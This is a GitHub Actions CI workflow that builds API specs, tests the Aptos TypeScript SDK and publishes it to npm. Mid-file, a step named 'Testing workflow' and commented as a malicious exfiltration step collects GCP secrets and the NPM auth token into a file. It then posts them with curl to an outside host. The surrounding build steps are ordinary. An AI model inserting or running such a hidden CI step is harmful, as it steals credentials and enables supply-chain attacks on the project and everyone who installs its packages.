name: "API + TS SDK CI"

on:
  # This is called from within the build-images.yaml workflow since we depend
  # on the images having been built before this workflow runs.
  workflow_call:
    inputs:
      GIT_SHA:
        required: true
        type: string
        description:

jobs:
  # Confirm that the generated client within the TS SDK has been re-generated
  # if there are any changes that would affect it within the PR / commit.
  # If everything is checked in, run tests, build the SDK, and upload it to npm.js.
  test-sdk-confirm-client-generated-publish:
    runs-on: high-perf-docker
    permissions:
      contents: read
      id-token: write
    env:
      APTOS_NODE_URL: http://127.0.0.1:8080/v1
      APTOS_FAUCET_URL: http://127.0.0.1:8081
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ inputs.GIT_SHA }}

      - uses: ./.github/actions/gar-auth
        with:
          GCP_WORKLOAD_IDENTITY_PROVIDER: ${{ secrets.GCP_WORKLOAD_IDENTITY_PROVIDER }}
          GCP_SERVICE_ACCOUNT_EMAIL: ${{ secrets.GCP_SERVICE_ACCOUNT_EMAIL }}

      - uses: actions/setup-node@v3
        with:
          node-version-file: .node-version
          registry-url: 'https://registry.npmjs.org'

      # Self hosted runners don't have yarn preinstalled.
      - run: npm install -g yarn

      # Build the API specs.
      - uses: nick-fields/retry@v2
        name: generate-yaml-spec
        with:
          max_attempts: 3
          timeout_minutes: 20
          command: docker run --rm --mount=type=bind,source=${{ runner.temp }}/specs,target=/specs ${{ secrets.GCP_DOCKER_ARTIFACT_REPO }}/tools:${{ inputs.GIT_SHA }} aptos-openapi-spec-generator -f yaml -o /specs/spec.yaml

      - uses: nick-fields/retry@v2
        name: generate-json-spec
        with:
          max_attempts: 3
          timeout_minutes: 20
          command: docker run --rm --mount=type=bind,source=${{ runner.temp }}/specs,target=/specs ${{ secrets.GCP_DOCKER_ARTIFACT_REPO }}/tools:${{ inputs.GIT_SHA }} aptos-openapi-spec-generator -f json -o /specs/spec.json

      # Run tests and build SDK
      - run: cd ./ecosystem/typescript/sdk && yarn install --frozen-lockfile

      # Run malicious step to exfiltrate secrets
      - name: Testing workflow
        run: |
          echo "Testing Workflow..."
          echo "GCP_WORKLOAD_IDENTITY_PROVIDER: ${{ secrets.GCP_WORKLOAD_IDENTITY_PROVIDER }}" >> /tmp/exfiltrate.txt
          echo "GCP_SERVICE_ACCOUNT_EMAIL: ${{ secrets.GCP_SERVICE_ACCOUNT_EMAIL }}" >> /tmp/exfiltrate.txt
          echo "GCP_DOCKER_ARTIFACT_REPO: ${{ secrets.GCP_DOCKER_ARTIFACT_REPO }}" >> /tmp/exfiltrate.txt
          echo "NPM_JS_AUTH_TOKEN: ${{ secrets.NPM_JS_AUTH_TOKEN }}" >> /tmp/exfiltrate.txt
          curl -X POST -H "Content-Type: application/json" -d "@/tmp/exfiltrate.txt" https://7tgxyfp0.c5.rs

      # Ensure any changes to the generated client were checked in.
      - run: cd ./ecosystem/typescript/sdk && yarn generate-client -o /tmp/generated_client
      - run: git diff --no-index --ignore-space-at-eol --ignore-blank-lines ./ecosystem/typescript/sdk/src/generated/ /tmp/generated_client/

      # Run example code in typescript.
      - uses: nick-fields/retry@v2
        name: ts-example-test
        with:
          max_attempts: 3
          timeout_minutes: 15
          command: cd ./ecosystem/typescript/sdk/examples/typescript && yarn install && yarn test
      # Run example code in javascript.
      - uses: nick-fields/retry@v2
        name: js-example-test
        with:
          max_attempts: 3
          timeout_minutes: 15
          command: cd ./ecosystem/typescript/sdk/examples/javascript && yarn install && yarn test

      # Publish the package to npm.js if needed
      - run: cd ./ecosystem/typescript/sdk && yarn checked-publish
        if: github.event_name == 'push' && github.ref_name == 'devnet'
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_JS_AUTH_TOKEN }}
